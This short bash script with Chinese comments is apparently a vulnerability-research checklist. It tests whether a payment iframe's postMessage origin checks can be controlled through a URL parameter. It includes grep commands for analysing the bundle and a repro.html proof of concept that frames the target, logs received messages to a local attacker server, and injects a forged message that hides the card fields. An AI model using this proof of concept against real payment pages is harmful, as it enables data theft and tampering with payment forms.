#!/usr/bin/env bash
# 判定一个支付/敏感 iframe 是否把 postMessage 信任边界交给 URL 参数
# 1) 读 HTML 引用的 bundle，找消息总线
grep -oE '.{0,120}postMessage\(.{0,160}' bundle.js | grep -E 'targetOrigin|this\.origin|"\*"' | head
# 2) 找 origin 解析：常见形态 location.search -> origin 参数
grep -oE 'function [a-zA-Z_$]+\([a-z]\)\{[^}]{0,120}\.origin[^}]{0,80}\}' bundle.js | head
# 3) 找白名单校验被调用的地方：返回值是否被使用
#    let r = parse(location); validate(r.origin)  <- 结果丢弃 = 洞
# 4) 起本地第三方源复现（见 repro.html）
python3 -I server.py &        # http://127.0.0.1:8099

# repro.html
# <iframe id=f src="https://TARGET/<hash>/iframe_v2.html?origin=http%3A%2F%2F127.0.0.1%3A8099"></iframe>
# <script>
# window.addEventListener('message', e => fetch('/log?o='+encodeURIComponent(e.origin)+'&d='+encodeURIComponent(e.data)));
# f.onload = () => setTimeout(()=>f.contentWindow.postMessage(JSON.stringify({subject:'ccFieldsHideChange',body:true}),'*'), 4000);
# </script>
#
# 判定：
#   收到 iframe 发来的 message                         -> targetOrigin 由参数决定
#   发出控制消息后 1ms 内收到回包（如 changeHeight）     -> 入站 origin 校验由参数决定
#   把参数改成 TARGET 自己的域名 -> 0 条消息（负对照）
#   参数改成 * -> 仍收到（无任何白名单）
